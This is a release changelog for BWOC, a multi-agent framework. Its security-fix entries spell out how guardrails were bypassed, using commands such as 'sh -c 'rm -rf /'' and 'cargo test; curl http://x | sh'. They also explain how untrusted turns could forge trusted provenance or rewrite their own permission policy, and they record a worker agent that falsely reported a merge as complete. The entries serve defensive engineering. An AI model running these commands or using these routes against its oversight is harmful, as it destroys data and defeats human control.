- **`anthropic` backend: the harness route to Claude models.** `backend = "anthropic"` runs `bwoc-harness --backend anthropic` (Anthropic Messages API, key from `ANTHROPIC_API_KEY`, `baseUrl` optional) for `bwoc spawn`, `bwoc run` and `bwoc chat`, including `--tui` and `--fleet`. `claude` still execs the vendor Claude Code CLI everywhere. The manifest `backend` field is a string, so existing manifests are unaffected.
- **Streamed reasoning in chat.** A new `thinking` `chat_proto` event carries reasoning text from OpenAI-compatible streams (`reasoning_content` / `reasoning`) and Anthropic `thinking_delta`. The TUI shows it dimmed, then collapses it to one line. Frontends that don't handle the event skip it.
- **`--max-context` and `[runtime] max_context`** set the model context window a chat session compacts against. See [`HARNESS.en.md` §Quick start](docs/en/HARNESS.en.md#quick-start-bwoc-in-any-repository).
- **Coding tools in `bwoc-harness`.** `glob` finds files by pattern (read-only, in the pure-read tier). `grep` now takes a regex, with `fixed_strings` and a `glob` file filter, and skips binary files; an invalid regex falls back to the old literal search. `edit_file` gains `replace_all`, and `multi_edit` applies several edits to one file, all or nothing. `run_command` gains `timeout_secs` (default 120, max 600) and kills the command's process group when it expires. `--chat` sessions also get `webfetch` (http(s) GET returned as text; local and private addresses refused; needs approval), `todo` (a task list held in memory for the session) and `subagent` (a read-only child session with a fresh context that returns its answer). See [`HARNESS.en.md` §The Tool Set](docs/en/HARNESS.en.md#the-tool-set).

## [v2026.9.13-2] — 2026-09-13 — 3.1.0

**bwoc-bot, phase 1 — one agent, one bot.** Chat connectors gain a `[bot]` block: fixed slash-command replies that never reach the model, per-sender rate and message-length caps, and an opt-in **limited public mode** that lets strangers reach the agent by DM or @mention — read-only tools, a separate workdir with no memories or other chats, and an Untrusted principal. File-tool confinement is now symlink-safe for every agent, and connector configs carry a `schema_version` that `bwoc migrate` stamps.

### Added

- **Connector `[bot]` block and limited public mode** — `connectors/<platform>.toml` now accepts `schema_version`, using the 3.0 `SchemaVersion`: absent ⇒ legacy v2, which loads with a warning; 3 is current; a newer revision makes the connector refuse to start. `bwoc migrate` now stamps `connectors/*.toml` and an optional `[bot]` table. `[bot]` adds fixed slash-command replies (`[bot.commands]`, exact first token, `@botname` stripped, never forwarded to the agent), a per-sender `rate_limit_per_min` (default 20: one notice, then silent drops) and `max_input_chars` (default 4000). `public = true` lets non-allow-listed senders reach the agent, but only by DM or @mention. Their sessions are locked to read-only harness `plan` mode, always capped, and run in their own workdir (`.bwoc/public/<platform>-<chat_id>/`, holding only copies of `AGENTS.md` and `config.manifest.json` minus `deepMemoryCmd`) outside team chat. Without `[bot]`, behaviour is unchanged (closed by default).

### Fixed

- **Tool path confinement resolves symlinks** — `ToolContext::resolve_path` only checked paths lexically, so a symlink inside the workdir that pointed outside let `read_file` / `list_dir` / `write_file` / `edit_file` escape. Confined paths now also canonicalize their deepest existing ancestor and must stay inside the canonical workdir (shared with `sandbox::confine_path`). `memory_read` / `memory_write` get the same check, and `grep` no longer follows an escaping link. `--unrestricted` is unchanged.

## [v2026.9.13-1] — 2026-09-13 — 3.0.1

**A patch release** — three fixes found while rolling 3.0 out across a real fleet: chat connectors kept one conversation file per agent (every chat shared it), `bwoc init` wiped an existing agent registry, and `bwoc new` still stamped spec 2.0. Upgrading is recommended; nothing to migrate.

### Fixed

- **Chat connectors isolate each chat's conversation** — every bridged chat shared the agent's single `.bwoc/chat-session.json`, so two chats (or a DM and a group) leaked context into each other and clobbered history. Each chat now persists to `.bwoc/chat-sessions/<platform>-<chat_id>.json` (sanitized; new `bwoc-harness --session-file`), and bridged turns carry `Principal::Platform { platform, user_id }` provenance instead of `Unknown` (still untrusted). `bwoc chat --tui` is unchanged.
- **`bwoc new` stamps the current specification.** On 3.0.0 it still wrote `"version": "2.0"` into `config.manifest.json` while the template's `AGENTS.md` said 3.0. Every freshly incarnated agent therefore warned "specification version 2.0 — run `bwoc migrate`" straight away. It now uses the same constant that `bwoc migrate` migrates to.
- **`bwoc init` no longer overwrites an existing `.bwoc/agents.toml`.** Before, it wrote an empty registry every time, including under `--force` (documented to replace only `workspace.toml`) and in a directory that had `agents.toml` but no `workspace.toml`. Every registered agent silently disappeared from the registry. Found while turning a daemon-only fleet host into a full workspace for the 3.0 migration.

## [v2026.9.13-0] — 2026-09-13 — 3.0.0

**BWOC 3.0 — the compatibility contract.** The first major driven by actual breakage rather than by a decision about a version number: through 2.x, exactly one artifact on disk could say which revision wrote it, `config.manifest.json`'s `version` was written and never read, and `[plugin].compat` was documented as enforced but was not. A format that cannot say what it is can only ever break silently, so this release makes every one of them say it — and writes down what the project will and will not break.

**Nothing breaks on upgrade.** 3.x reads everything 2.x wrote, warns, and names `bwoc migrate`. Schema 2 support is removed in 4.0. See [`docs/en/COMPATIBILITY.en.md`](docs/en/COMPATIBILITY.en.md) for the contract and [`docs/en/MIGRATION.en.md`](docs/en/MIGRATION.en.md) for the path.

### Added

- **A schema version on every artifact BWOC owns** — `schema_version` in `.bwoc/workspace.toml`, `.bwoc/agents.toml`, `.bwoc/interconnect/routes.toml`, `.bwoc/harness-policy.toml` and `.bwoc/peers.toml`, decided in one place (`bwoc-core::schema`). Absent means schema 2, which is what makes the upgrade non-destructive. `.bwoc/doc-kinds.toml`, `.bwoc/secrets.toml`, `.bwoc/installed-sources.toml`, `.bwoc/teams/*.toml` and the `*.jsonl` streams are deliberately unversioned — no reader could act on the marker.
- **`bwoc migrate [path] [--all] [--dry-run] [--json] [--yes] [--no-backup]`** — moves a workspace or an agent onto the current schema and specification. Idempotent. It **splices text and never reserializes**: `Manifest::save_to_path` drops `skills.framework[]` and `Workspace::save` drops `[plugins.*]`, since neither struct models a catch-all, so a migration built on them would quietly delete an operator's config while claiming to upgrade it. Comments, key order and unmodeled tables survive byte-for-byte. Originals are copied to `<root>/.bwoc/migrate-backup/<timestamp>/`, inside the control plane — a sibling `config.manifest.json.bak` would sit outside the harness gate and could be planted by an untrusted turn for an operator to restore.
- **[`COMPATIBILITY.en.md`](docs/en/COMPATIBILITY.en.md) / [`MIGRATION.en.md`](docs/en/MIGRATION.en.md)** (both with Thai pairs) — the three public surfaces and, explicitly, the Rust API as not one; the one-major support window; read-forward and downgrade rules; the deprecation sequence. `SECURITY.md` gains a Supported Versions section, and `RELEASING` a "Cutting a major" checklist.
- **Phase 7 — *anicca*** in the roadmap, plus the **Phase 6 section that never existed in either language** (it lived only as a sentence in the status paragraph). Phase 6 is declared DoD-met.

### Changed

- **Specification 3.0, and it is now read.** An agent declares `"version": "3.0"` in `config.manifest.json`, mirrored by the `| **Version** |` row in its `AGENTS.md`. `bwoc check` validates it: 3.0 passes, 2.0 is a **warning** naming `bwoc migrate`, anything else is a violation. No section of `AGENTS.md` changed — the contract around the version did, not the document.
- **`[plugin].compat` is enforced, and ranges must be bounded above.** The eight resolvers that run a plugin refuse a mismatch rather than skipping it (reporting "not installed" for a plugin on disk sends the operator looking in the wrong place); `bwoc plugin show` marks it `WILL NOT LOAD` instead, since a listing should show it. `bwoc check` grades three ways: unparseable is a violation, a mismatch is a warning, an open-ended range is a warning. All 29 in-tree manifests move to `>=3.0.0, <4.0.0` — enforcing the old `>=2.x` shape would have gated nothing, because a bare `>=` comparator has no ceiling.
- **`bwoc task add` gates completion by default.** The Pavāraṇā plan-approval gate was opt-in via `--requires-plan`; it is now on unless you pass `--no-plan`. **Breaking** for any script that adds a task and completes it without a lead-approved plan. The flip has a cause: the first `bwoc-harness --lead --loop` run against a real task list marked "merge branch X to main" completed by a worker that had merged nothing — the one task in that run without a gate — and the false completion unblocked its dependent. An ungated task is a task an agent can assert done without doing, so the safe state is the default and the exemption is explicit.
- **`bwoc task reopen <team> <task> [--reason …]`** withdraws a completion, because the state machine previously ran one way only and correcting a false one meant hand-editing `tasks.jsonl` outside the locked path. An operator verb — no `--as`, no membership check, since the party that made the false claim should not be authorising its withdrawal. Clears the claimant, the completion stamp, and on a gated task the approval verdict (a surviving `Some(true)` would let the next claimant complete without a fresh plan); keeps the submitted plan text, which is the claimant's account and therefore evidence. Dependents are reported, never cascaded.
- **`harness-policy.toml` and `peers.toml` fail closed on a newer schema** — refused rather than read with the unknown parts ignored. These decide what a turn may do and whose signature counts as verified; ignoring a key this build cannot interpret would grant a permission the operator never wrote.
- **`VERSION.md`** drops a stale promise of a crates.io publish at the Cargo `1.0.0` milestone — the workspace passed that point 40-odd minors ago without publishing. The Rust API is stated as not a public surface instead.
- **One exit-code contract across the whole CLI** (new `crates/bwoc-cli/src/exit.rs`, documented in [`COMPATIBILITY.en.md`](docs/en/COMPATIBILITY.en.md#exit-codes-30)). Before 3.0 each family invented its own vocabulary: `bwoc check` returned `1` for violations while `bwoc workspace validate` returned `2` for the *same* semantic — and `2` elsewhere means "not found", so a script could not tell a missing workspace from a workspace with violations. Now `1` = the command errored, `2` = usage/not-found, **`3` = a negative-but-valid finding** (`check` / `validate` violations, `council` not-resolved), `4` = missing plugin, `255` = internal. **Breaking:** `check` violations moved `1 → 3` and `validate` violations `2 → 3` (a `|| fail` guard still fires; a `[ $? -eq 1 ]`/`-eq 2` test must move to `-eq 3`). The nine plugin fronts now source their codes from the one table so they cannot drift.

### Fixed

- **`Routes::remove_agent_routes` would have silently stripped the schema marker** — it reserializes through a private wire struct, so any `bwoc retire` would have quietly un-migrated a workspace.
- **The accounting integration test wrote a plugin manifest with no `compat` field** — required since 2.5, undetected because nothing read it.

### Security

- **A verified cross-workspace envelope must be replay-checkable.** `ReplayGuard::check` skipped the duplicate check for an empty `nonce` and the freshness window for an empty `ts`. A signed envelope that carried neither a `nonce` nor a `ts` passed signature verification and could then be re-delivered with no limit. Such an envelope now refuses as `unreplayable`. `bwoc send` always sets both fields, so no BWOC sender is affected, and unsigned envelopes behave as before.

### Migration

```bash
bwoc migrate --all --dry-run   # see what would change
bwoc migrate --all             # apply; originals under .bwoc/migrate-backup/
bwoc check --all               # confirm
```

Plugin authors: give each `manifest.toml` a bounded `compat = ">=3.0.0, <4.0.0"`. `bwoc migrate` deliberately does not do this for you — declaring which framework a plugin works with is the author's assertion to make.
## [v2026.9.6-0] — 2026-09-06 — 2.45.0

**A hardening release.** Seven robustness and trust-boundary fixes surfaced by a comparison pass against xAI Grok Build (see `research/2026-08-23_grok-build-comparison.md`). Several are security-relevant; upgrading is recommended for anyone running `bwoc-harness` against a remote model endpoint or a permissive permission policy.

### Fixed

- **HTTP 429 / 408 are retryable, not fatal** (#486) — a rate limit is the single most common real-world provider failure, yet it aborted the whole run while the *rarer* 5xx got three backoff retries. `classify_http_error` now maps 429 and 408 to a transient error that rides the existing 200 ms→3.2 s backoff loop, and a server `Retry-After` hint is honoured (clamped to ~4× the backoff cap so a hostile or misconfigured endpoint cannot park the run). One function fronts every backend, so the fix is backend-neutral.
- **Guardrails peel command wrappers before gating** (#487) — the destruction (`Pāṇātipāta`) and privilege-escalation (`Bhava-taṇhā`) checks resolved the binary as the first non-`VAR=val` token, so `env rm -rf /`, `command rm -rf ~`, `timeout 5 rm -rf /`, `xargs rm -rf`, and `sh -c 'rm -rf /'` all walked past the check. A new fail-closed `argv::peel` normalizes a segment to the argv that will actually run (stripping a wrapper set, unwrapping one `sh -c '<literal>'`), wired identically into `check_destruction`, `check_privilege_escalation`, and `sandbox::scan_args`. Guardrails is the unoverridable floor, so this was silent under-blocking.
- **An allow-pattern can't be tricked by a chained command** (#492) — a pattern `allow "cargo test"` matched the raw JSON substring and granted `{"command":"cargo test; curl http://x | sh"}` whole. An `allow` on a shell-bearing tool now grants only when every peeled segment of the command is covered by an allow pattern (`git` is matched as one literal argv, not shell-split); `deny`/`ask` keep the safe substring match, and unparseable args fail closed.
- **Operator text typed during a permission prompt is no longer lost** (#489) — the shipped TUI echoed the text locally so it *looked* sent, but `read_permission` treated any non-permission line as a bare deny and discarded it. The tool is still denied (fail-safe), but the text is recovered and replayed as the next turn.
- **A panic no longer strands the terminal** (#490) — a panic in any TUI event loop left the operator's terminal in raw mode + alternate screen. An RAII `TerminalGuard` restores it on unwind (BWOC uses default unwind panics, so no signal handler is needed) across `bwoc-tui`, `bwoc-loop-tui`, and the CLI dashboard.
- **`bwoc-deep-memory` insert dedup + embedding-model stamp** (#491) — the full `chat-session.json` was re-mined every resume with no `UNIQUE` constraint, so the store grew linearly; and same-dimension model switches silently mis-ranked. Uniqueness is now `(source, text, embed_model)` with `INSERT OR IGNORE` (idempotent re-mine, yet a model switch re-embeds instead of vanishing), and `search` filters rows to the current model. Secret redaction still runs before insert.

### Added

- **A byte budget on tool output** (#488) — there was no cap anywhere in the tool path, so a whole-file `read_file` or chatty `run_command` was an unbounded context/cost DoS that Layer 0 permits on an untrusted turn. Output is clamped once at the dispatch seam (covering every tool and every MCP tool) to 64 KiB with an *actionable* truncation notice, and `read_file` gains `offset` / `limit` to page a large file deliberately.

## [v2026.8.20-2] — 2026-08-20 — 2.44.2

**A security release.** Two ways an untrusted turn could escape the trust boundary are closed, both reachable on today's shipped code. Upgrading is recommended for anyone running `bwoc-harness` against a remote or shared model endpoint, or auto-processing inbound agent messages.

### Fixed

- **A provider response can no longer choose its own provenance** — the non-streaming (default) path deserialized the completion straight into a `ChatMessage`, `principal` included, so an endpoint that was hostile, compromised, or merely MITM'd could answer `"principal":{"kind":"self_agent"}` — one of only two **Trusted** principals — and flip the turn to Trusted, making the Layer-0 capability gate a no-op and unlocking `run_command`, `git push` and network egress. It could equally forge a verified sender identity, or a `"role":"system"` that then rode along in every later request. An `ollama` endpoint is plain HTTP by default. A completion is by definition the agent's own model turn, so both role and principal are now stamped as such and whatever the wire claimed is discarded. The streaming path was never affected (it rebuilds the message locally).
- **An untrusted turn can no longer write its own control plane** — the Layer-0 gate allowed any write that `confine_path` placed inside the worktree, and `<worktree>/.bwoc/` *is* inside the worktree. That reached `harness-policy.toml` (the permission policy itself — rewrite it to allow-all and Layer 2 stops objecting), `peers.toml` (the pinned signing keys a remote sender is verified against), the replay-nonce store, the refusal audit trail, the workspace/agent registry, and `config.manifest.json`. Writes to that state are now refused regardless of confinement — matched both by name and by canonical target, so a symlinked `.bwoc` cannot slip past. Ordinary worktree content writes and trusted turns are unaffected.
- **Replay defense survives a daemon restart** — the seen-nonce set was memory-only, so restarting the daemon forgot every nonce and a captured, validly-signed envelope could be raced back in within the ±300 s freshness window. Nonces are now persisted to a self-pruning sidecar (`<agent>/.bwoc/replay-nonces.jsonl`, gitignored for new workspaces).
- **A wire message or persisted file can no longer assert a verified sender identity** — `ChatMessage::ingest` clamps `A2aSender` as well as `SelfAgent`, and checkpoint / chat-session reloads apply the same clamp. Only code that has just verified a signature may stamp that principal.

### Added

- **A release gate for the "Latest release" pointers** — `README.md`, `VERSION.md`, `Cargo.toml` and `Formula/bwoc.rb` are now checked against the topmost `CHANGELOG.md` release, offline. Each of those had silently drifted (the README and `VERSION.md` by two releases; the formula by five in an earlier era). The formula is allowed to trail by exactly one release, since its checksums only exist after the artifacts do.

### Changed

- **`trust::evaluate` reports which signature actually verified** — `TrustOutcome::Pass` carries `verified_from`, set only from the crypto-success branch for a cross-workspace sender. Internal plumbing toward the deferred middle trust tier (#452); nothing consumes it yet.

## [v2026.8.20-1] — 2026-08-20 — 2.44.1

A packaging fix: **`bwoc-harness` now ships in the release archives.** Until this release it was shipped by no install path at all, so any install that wasn't a workspace checkout had a `bwoc` that could not spawn the component running the agentic loop.

### Fixed

- **`bwoc-harness` is included in every release archive and every install path** (#460). `cargo build --release --workspace` already built it in CI, but the packaging step only copied `bwoc` and `bwoc-agent` — and nothing asserted the archive's contents, so it shipped incomplete for many releases. `bwoc chat --tui`, `bwoc eval`, `--headless`, `--lead` and `--task` all failed at spawn on a Homebrew or archive install. Both packaging steps (tar.gz + zip) now copy the harness **and assert all three binaries are present**, failing the build rather than publishing a silently-incomplete archive.
- **`scripts/install.sh` installs the harness too** — the from-source path had the same gap, installing only `bwoc-cli` and `bwoc-agent`. `--check` and `--uninstall` now cover all three binaries.
- **`bwoc doctor` no longer suggests `cargo install bwoc-harness`** — no BWOC crate is published to crates.io, so that hint could never work. It now points at `./scripts/install.sh` from a repository clone, and notes that released builds need no toolchain at all.
- **The workspace `repository` URL was wrong** — `[workspace.package]` pointed at `bmt-bwol-ops/bwoc-framwork` (wrong org *and* a misspelling), which is every crate's published package metadata. Corrected to `bemindlabs/BWOC-Framework`; `bwoc-mqtt`, which never inherited the field at all, now does.

### Added

- **A `README.md` for every crate**, plus a gate (`crates/bwoc-cli/tests/crate_readmes.rs`) asserting each crate has a non-trivial README and declares `readme = "README.md"` in its manifest — without which the file would not ship in `cargo package`. Seven crates had none; three of the four that did described built-out crates as "Phase 1 — scaffold".

### Changed

- **Root `README.md` refreshed** — it had drifted two releases (Latest-release pointer stuck at 2.42.0, crates table listing 7 of 11, and no mention of `bwoc loop` / `monitor` / `digest`).

## [v2026.8.20-0] — 2026-08-20 — 2.44.0

Loop-Engineering **L3 — product loops**: the layer's first two external loops ship, both built on a new durable idempotency primitive and both deliberately trust-preserving. The middle trust tier that the remaining L3 loops need begins landing, inert-first.

### Added

- **`bwoc monitor` — the L3 monitoring/alerting flagship.** `bwoc monitor --exec "<probe>" [--alert <agent>] [--loop]` probes a command on the `Every` ticker (exit 0 = OK, non-zero / spawn-fail / signal = TRIP), detects OK↔TRIP transitions, and `bwoc send`s a fleet member **once per transition** — not once per tick. State is durable under `.bwoc/monitors/<id>.jsonl`, so a restart mid-trip doesn't re-alert. **Zero trust-model change**: the alert body carries only trusted scalars (monitor id + exit code); the probe's untrusted stderr is logged locally and never enters the message a model will read (#454).
- **`bwoc digest` — the L3 recurring-digest loop.** `bwoc digest --exec "<cmd>" [--period hourly|daily|weekly] [--out <file>] [--loop]` runs a command **once per period** and delivers its rendered output — the gate a bare cron can't give (a restart mid-period re-runs the job; a poll-driven loop re-fires every tick). The period is an epoch bucket latched through the ledger. Delivery is to a **local sink only** (stdout or `--out`), never a fleet agent's model-read inbox, so a digest's arbitrary command output can't become an injection channel (#456).
- **`bwoc-core::idempotency::IdempotencyLedger` — the durable L3 primitive.** A dependency-free key→value ledger persisted as a JSONL sidecar, written atomically (tmp + rename). Two operations: `seen_or_record` (one-shot idempotency — "have I ever acted on this key?", the digest's once-per-period gate) and `latch` (edge-trigger — "did this value just change?", the monitor's once-per-trip gate, which a plain seen-set cannot express) (#453).
- **Act-as-user capability tier — inert first slice of the L3 middle trust tier.** A new `Capability::ActAsUser` grade between `WorktreeWrite` and `Gated` classifies `bwoc_send`, plus a fail-closed `scan_authenticated_actor` that grants act-as-user authority only when every taint-bearing ingress is one matching verified A2A sender (any foreign taint — a tool output, a second sender, a tainted summary — evaporates it). Authority lives entirely at the **capability** layer: the tier reuses the existing `Principal::A2aSender`, so `trust.rs` is untouched and the monotonic session-trust latch and two-trusted invariant still hold. **Zero production behavior change** — the one call site passes no actor, so `bwoc_send` stays denied on untrusted turns exactly as before; daemon minting lands in a later slice (#457, toward #452).

- **`bwoc run` now supports the `codex` backend headlessly.** Codex CLI grew a documented non-interactive mode (`codex exec`, approval policy `never`), so the `HeadlessUnsupported` deferral no longer holds. Dispatch is `codex exec --skip-git-repo-check --color never --sandbox workspace-write -- "<task>"`: repo-check off because an agent directory need not be a git repo, colour off because output is captured into `RunResult`, and `workspace-write` because `exec` defaults to read-only (which cannot complete an edit task) — bounded to the run cwd, the same jail `resolve_workdir` already enforces. `--dangerously-bypass-approvals-and-sandbox` is deliberately **not** passed, matching the fail-safe posture that keeps `--allow-all-tools` off the copilot path. Like the `claude` arm, no `-m` is forwarded: a backend-neutral manifest `primaryModel` may name a model codex rejects outright (a real `agent-caoguojiu` config pairs `backend = "codex"` with `claude-sonnet-4-6`), so the vendor CLI resolves its own model. `agy` and `kimi` remain deferred.

### Changed

- **`bwoc run` child processes get `/dev/null` on stdin** (all backends). A headless run must never block on an inherited terminal, and vendor CLIs that append piped stdin to the prompt (`codex exec` does) must not absorb whatever the orchestrator left on the pipe.

### Fixed

- **A delivered-but-undispatched inbound message is now logged** rather than silently dropped from the operator's view: the daemon records when a message was delivered to the inbox but no route consumed it, so a message that lands and then goes nowhere is observable (#451, rec-3 of #410).

## [v2026.8.19-0] — 2026-08-19 — 2.43.0

The Loop-Engineering layer lands: a goal + ticker loop that drives a Saṅgha team toward Definition-of-Done, plus `bwoc loop` — a full operator console for it.

### Added

- **Loop-Engineering L1 — the goal loop.** `bwoc-harness --lead --loop` re-fires the Saṅgha lead until a Definition-of-Done (team task list fully `Completed`), a Blocked state (dependency-blocked, or a HELD `requires_plan` task awaiting the lead), or an iteration budget — a provably-terminating loop built on the most-tested primitive (#437, #438).
- **`bwoc loop` — the Loop-Engineering control-center TUI** (new crate `bwoc-loop-tui`). Observe a team's task list drive toward DoD; **start / stop** the goal-loop with a live output-log pane; and **edit in place** — add a task, tune the ticker/budget, approve or reject a plan-gated task — every task-list write going through the locked `bwoc task` CLI path so it serialises with a running loop and the daemon (#444, #445, #446).
- **Fleet-health reconcile loop.** `bwoc fleet health --loop` drives the fleet to all-green: it auto-remediates the stale-PID/socket class via `bwoc doctor --auto` and surfaces the rest, bounded by an iteration budget so it provably halts (#439).
- **Operator-tunable daemon task-poll cadence** via `BWOC_TASK_POLL_SECS` (default 2s, floored at 1s), replacing the previously hardcoded constant and making the daemon the third consumer of the shared `Ticker` (#442).
- **Session-scoped "Always allow" approval grants.** Answering a non-TTY approval with **Always** now skips the prompt for identical `(tool, args)` calls for the rest of the session — in-memory only, keyed on the exact arguments (no hash-collision bypass), never written to policy on disk (#443, closes #409).

### Changed

- **Shared `Ticker` + `Budget` primitives** extracted into `bwoc-core::loop_control`, now consumed by the L1 goal-loop, the L2 fleet-health loop, and the daemon task-poll — one bounded-cadence primitive across the fleet (#440).

### Fixed

- **Homebrew formula version keyed on the CalVer tag** (`v2026.8.12-0` → `2026.8.12.0`) instead of the Cargo SemVer, so `brew upgrade` detects every new release; the tag shape is now strictly validated so a malformed tag fails fast rather than emitting a broken version (#441, #435).
- **Goal-loop HELD labelling** no longer mislabels a dependency-blocked `requires_plan` task as awaiting plan approval; the budget-0 banner and a doc path are corrected (#438).

### Docs

- **`docs/en/LOOP-ENGINEERING.en.md` + `docs/th/LOOP-ENGINEERING.th.md`** — new bilingual spec of the goal + ticker + gate layer, the use-case catalog, and the phased build plan (#436); updated to mark L1 shipped, note the tunable task-poll cadence, and cross-reference the `bwoc loop` operator console (#447).

## [v2026.8.12-0] — 2026-08-12 — 2.42.0

Agent memory (Tier 1) is now actually used, and the hook surface is hardened and documented.

### Added

- **Tier-1 memory recall at boot + `memoryPath` honored.** `bwoc-harness` now loads the agent's `MEMORY.md` index into the system prompt at the start of every run/chat (the Tier-1 counterpart to the existing Tier-2 wake-up, SRS FR-7.16), with a reminder to verify each claim against current code. The memory tools and recall resolve the manifest's `memoryPath` (default `memories/`) instead of hardcoding `memories/`, and `memory_write` warns when a `MEMORY.md` write exceeds the 200-line cap (never truncates) (#428).
- **`bwoc check` validates memory-file front-matter.** Each memory file must declare `name`/`description`/`type`/`created`/`updated`, and `type` must be one of `user|feedback|project|reference` (SRS FR-7.2). Warnings, not violations (#429).
- **`bwoc check` flags author-added Claude-only hooks.** A behavior wired under `.claude/hooks/` runs only on Claude; the neutrality audit now warns for any hook beyond the framework-shipped baseline, so a Claude-only behavior no longer passes clean (Samānattatā) (#432).
- **`bwoc send --dry-run` for broadcasts** — preview the recipient set of `--all` / `--team` without sending (#425).

### Fixed

- **`.bwoc/hooks/` task hooks run with a scrubbed environment (security).** `run_task_hook` no longer inherits the operator's full environment — a planted hook was handed `GITHUB_TOKEN`/`SSH_AUTH_SOCK`/cloud creds. It now reuses `bwoc-core`'s shared env scrub (allowlist + credential strip) plus the `BWOC_*` context, and the event name is validated to a single kebab segment (no traversal) (#430).
- **Parent-side worktree git hardened against config-RCE.** `worker.rs`'s `git worktree add/remove` — a parent-privilege spawn over a git dir shared with untrusted child turns — now applies the same `-c core.hooksPath=/dev/null …` + `GIT_CONFIG_GLOBAL/SYSTEM=/dev/null` hardening as the diff-read path, closing a C7 planted-`core.fsmonitor`/`hooksPath` bypass (#431).
- **`bwoc fleet status` shows real pid liveness** — an agent reads *online* only when its daemon pid is actually alive, not from inbox mtime (#424).
- **Outbox spool guarded against recipient-id path traversal** — a crafted recipient can't escape `.bwoc/outbox/` (#422).

### Docs

- **Full task-hook event catalog** in `interconnect/sangha.md` (+ TH): documents `task-claimed` (was undocumented), the per-event `BWOC_*` schema, and the env-scrub + blocking-veto contract (#433).
- **`bwoc fleet term` documented** under fleet-governance condition 2; `bwoc fleet health` note corrected to reflect that it ships (#426).
- **Messaging doc TH parity restored** + stale broadcast "deferred" note dropped (#423).

### Tests

- Regression net: a poison (unparseable) outbox spool line must not wedge `flush` — the good lines still drain and the bad one is kept (#427).

## [v2026.8.8-0] — 2026-08-08 — 2.42.0

### Added

- **`bwoc send --all` / `--team` — broadcast fan-out.** One command sends a message to every workspace agent (`--all`) or a Saṅgha team's members (`--team`), reusing the single-send path per recipient (signing, routing, MQTT/gateway relay). `--from <agent>` excludes that agent from its own broadcast; per-recipient failures are labeled, not fatal (an offline peer is spooled — see below); a compact `N delivered, M not-live, K failed` summary shows who got it (#417).
- **Durable offline delivery — outbox spool + `bwoc outbox flush`.** A send to an offline remote peer no longer loses the message: the signed envelope is spooled to `<workspace>/.bwoc/outbox/<recipient>.jsonl` (durable, unlike the gateway's in-memory park) and reported as *spooled*. `bwoc outbox list` shows what's pending; `bwoc outbox flush [--peer <id>]` replays each envelope verbatim (same `messageId` + signature → recipient inbox dedup makes retry effectively-once) (#418).

### Fixed

- **`bwoc fleet term` no longer collides when two fleets run at once.** The tmux session defaulted to a fixed `bwoc-fleet`, so a second fleet (different workspace) refused with "already exists". `--session` is now optional; the default is a per-workspace `bwoc-fleet-<slug>-<hash>` (workspace basename + FNV-1a of the canonical path) — different workspaces get different sessions, while re-running in the same workspace attaches the existing fleet instead of refusing (#419).

## [v2026.8.6-0] — 2026-08-06 — 2.42.0

### Added

- **`bwoc fleet term` — tiled fleet terminals + cross-pane messaging.** Opens one titled tmux pane per fleet agent in a single session, arranged by a selectable layout (`grid` / `columns` / `rows` / `main-vertical` / `main-horizontal`, cycled live with `<prefix> Space`); portable across macOS + Linux. `bwoc send <agent>` now resolves a recipient to its *pane* (matched by title), so a peer message wakes that agent's specific tile — the human watches the exchange land in place — and `remain-on-exit` keeps a finished agent's pane from collapsing the layout (#414).
- **Warm per-sender message sessions in `bwoc-agent --serve`.** Untrusted inbound messages reuse a warm resident session per sender (LRU-capped, idle-evicted) instead of cold-starting a subprocess per message, cutting latency on the untrusted delivery path (#412).

### Fixed

- **Inbox auto-reply now actually fires.** The Stop hook read the reply from the transcript, which may not have flushed the just-finished turn yet — silently dropping bus replies. It now takes the reply from the Stop payload's `last_assistant_message` (transcript scan retained as a fallback) and preserves leading whitespace so an indented code block at the start of a reply survives (#413).
- **Inbox wakeup reaches `bwoc`-launched tmux sessions.** `bwoc send` resolved only bare session names, missing the `bwoc-agent-<x>` sessions `bwoc chat --tmux` creates; it now tries the launcher's naming candidates and delivers the notification as a literal keystroke (#411).

## [v2026.8.1-0] — 2026-08-01 — 2.42.0

### Added

- **Multi-agent fleet TUI (OpenCode-style).** `bwoc chat <agent> --tui --fleet` opens a left fleet sidebar with one live `bwoc-harness --chat` session per agent, `Tab` / `BackTab` to switch (#393). The conversation surface gained: scrollback (`PageUp` / `PageDown` / `End`) (#395), an `F2` permission-mode selector (default → accept_edits → bypass) (#398), a `Ctrl-P` command palette (switch / forget / quit, fuzzy-filtered) (#397), a per-agent honest token header (`ctx` / `out` / compaction count — real `chat_proto` data only, no drift-prone context-window or price tables) (#400), and `@mention` routing that injects a message straight into another fleet member's live session (#401). Each pane drives its agent with that agent's **own** backend + manifest-resolved model / endpoint, guarding the untrusted `path` field against traversal (#399). Tool calls, results, permission prompts, and errors now render inline in one full-width transcript with an inline `[a]llow / [d]eny` affordance (#404).
- **Human-in-the-loop approval channel for non-TTY `ask` tools.** A fleet agent spawned without a TTY routes `ask`-mode tool calls to a file-based approval console under `<workdir>/.bwoc/approvals/`, blocking for the operator's verdict. Fail-safe preserved: the channel can only turn a would-be **deny** into an operator-approved **allow**, never weaken a deny (#392).

### Fixed

- **`ModelNotFound` no longer misdirects on a wrong endpoint.** A 404 from a `baseUrl` missing `/v1` was reported as "check the model tag"; the message now names both causes and scopes the endpoint hint to OpenAI-compatible backends (the variant is shared with the Anthropic / CLI backends) (#402).
- **A tool call emitted as plain text is no longer a silent no-op.** A weak or mis-templated model that returns a tool call as text (no structured `tool_calls`) now surfaces a warning — inline in the chat TUI, on stderr in batch — instead of ending the turn silently. Warn only; the text is never parsed or executed (#403).
- **Saṅgha task-hook flake under load.** The task-hook exec now retries on `ETXTBSY` (a write-then-exec race on Linux under high parallelism), fixing an intermittent CI failure (#394).

## [v2026.7.27-0] — 2026-07-27 — 2.42.0

Backfilled: this release shipped without a CHANGELOG entry at the time.

### Added

- **LLM Sprints 1–3 (Anthropic backend).** Effort parity, configurable `max_tokens`, and usage accounting (#380); provider prompt caching, on by default (#381); extended thinking + replay on the non-streaming path (#382); streaming thinking-block preservation + cache-token capture (#383).
- **MCP transport upgrades.** Protocol-version bump + negotiation (#384) and a Streamable HTTP transport for remote MCP servers (#386).
- **Multimodal + computer tool.** Provider-neutral multimodal image serialization (#385); computer-tool screenshots wired through the isolated-executor IPC (#387).

### Fixed

- **Release idempotency.** `release.yml` no longer 422s / skips binary builds when the release pre-exists — `create-release` is now idempotent (#390, closes #371).
- **Dependency hygiene.** Bumped `quinn-proto` 0.11.14 → 0.11.15 (GHSA-4w2j-m93h-cj5j) (#388); dropped `rumqttc`'s unused `rustls` feature, removing `rustls-webpki` 0.102.8 (#391, fixes #389).

### Changed

